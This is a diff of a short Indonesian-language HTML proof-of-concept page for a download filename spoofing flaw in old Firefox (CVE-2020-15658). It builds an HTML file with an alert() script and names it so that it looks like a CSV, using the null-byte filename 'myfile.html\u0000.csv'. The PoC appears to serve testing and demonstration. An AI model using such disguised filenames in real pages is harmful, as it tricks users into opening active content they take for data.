@@ -1,28 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Download Filename Spoofing PoC</title>
+  <title>PoC: Download File Spoof</title>
 </head>
 <body>
-  <h2>Test: Fake CSV File Download</h2>
+  <h2>Simulasi Download File Spoof (CVE-2020-15658)</h2>
 
-  <p>
-    Klik tombol di bawah untuk mengunduh file "CSV" yang sebenarnya adalah HTML.
-  </p>
+  <p>Tekan tombol di bawah untuk mengunduh file dengan nama terlihat seperti CSV, tetapi isinya HTML.</p>
 
-  <button onclick="downloadFakeCSV()">Download Fake CSV</button>
+  <button onclick="downloadSpoofed()">Download File</button>
 
   <script>
-    function downloadFakeCSV() {
-      const blobContent = `<html><body><script>alert('XSS via HTML download')</script></body></html>`;
-      const blob = new Blob([blobContent], { type: "text/html" });
+    function downloadSpoofed() {
+      // Simulasi isi file HTML
+      const htmlContent = `<html><body><h1>INI FILE HTML</h1><script>alert('CVE‑2020‑15658')</script></body></html>`;
+      const blob = new Blob([htmlContent], { type: "text/html" });
 
       const a = document.createElement("a");
       a.href = URL.createObjectURL(blob);
 
-      // Download name: terlihat sebagai .csv, tapi sebenarnya .html
-      // Bug: Firefox lama akan menyimpan sebagai myfile.html, meskipun ditampilkan sebagai myfile.html.csv
-      a.download = "myfile.html\u0000.csv";
+      // Tidak bisa pakai \u0000 di browser modern, jadi kita simulasi saja
+      // Versi bug: a.download = "evil.html\u0000.csv";
+      a.download = "report.csv"; // Terlihat seperti CSV, tapi isinya HTML
 
       document.body.appendChild(a);
       a.click();
